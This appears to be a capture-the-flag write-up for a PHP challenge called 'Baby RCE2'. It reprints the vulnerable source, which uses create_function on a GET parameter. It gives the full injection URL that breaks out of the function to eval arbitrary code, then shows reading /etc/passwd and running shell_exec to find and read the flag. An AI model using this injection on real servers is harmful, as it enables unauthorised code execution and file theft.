Alright, so we are initially greeted with a jarring pink page, a link to the source code, and a link to the page with "?code=echo 'hello foobar';" added on. From the name of the challenge alone, I know that this will be a remote code execution challenge. While PHP isn't my strong suit, this seems to be a good intro. Let's take a look at the source code.

```PHP
<?php
  error_reporting(0);
  if (isset($_GET['source'])) {
    show_source(__FILE__);
    die();
  }
?>

<!DOCTYPE HTML>
<html>
  <head>
    <title>baby rce2</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <style>
      body, html {
        height: 100%;
        background-color: #FF0DFF;
        color: black;
      }
      .corb-centered {
        position: relative;
        left: 50%;
        /* bring your own prefixes */
        transform: translate(-50%, 25%);
        background-color: white;
        padding: 20px;
        border: 2px solid black;
        border-radius: 25px;
      }
      .corb-php {
        max-width: 50%;
      }
    </style>
   <meta charset="UTF-16">
  </head>
  <body>
    <div class="corb-centered corb-php text-center">
      <h1>Baby RCE2</h1>
      <h3>
        <a target="_blank" href="/index.php?source">source</a>
      </h3>
      <h3>
        Start here : <a href="/index.php?code=echo 'hello foobar';">Hello foobar</a>
      </h3>

      <div class="text-left">
        <h3>Output : </h3>
        <pre><code><?php
        if (isset($_GET['code'])) {
          $new_func = create_function('', $_GET['code']);
          if ($_GET['code'] === "echo 'hello foobar';") {
            $new_func();
          }
        }
        ?></code></pre>
      </div>
    </div>

  </body>
</html>
```

Seems to me that the first php block is just there to show us the source code and not load the page at all if we have a GET parameter named "source". So, the only bit of code that we should really need to focus on is this:

```php
<?php
        if (isset($_GET['code'])) {
          $new_func = create_function('', $_GET['code']);
          if ($_GET['code'] === "echo 'hello foobar';") {
            $new_func();
          }
        }
        ?>
```

So, in order, if there is a GET parameter named "code", it stores create_function("", <code we enter>) in a variable. That variable seemingly only runs the function if we have specifically entered "echo 'hello foobar';". Given that this is an RCE, I imagine there's some way around that, though.

Turns out create_function is deprecated. Part of the reason for that is that it runs an internal eval(), which is full of security issues. Sure enough, it didn't take long to find out that I can run an extra function that will be looking for a GET variable right after echo, so long as I use a bracket to close the anonymous function. The full URL that I used to accomplish this was `http://chall.ctfs.me:8012/index.php?code=echo%20%27hello%20foobar%27;}eval($_GET[script]);/*;&script=echo%20hi;`. This overrides the original 'hello foobar' echo, and instead runs the code of my choice in the GET parameter "script".

Now I can execute code, but I have no idea what to execute to get the flag. Great. Initially I used `readfile` to read out /etc/passwd for me, but there was no luck there. Then I found out shell_exec existed, and that made my life a million times easier. PHP isn't my strong suit, but I can work with bash.

Going up one directory at a time, I found the `flag.txt` file with `shell_exec("ls ../../.. -la");`. Now I just needed to read it with `cat` and I was home free.
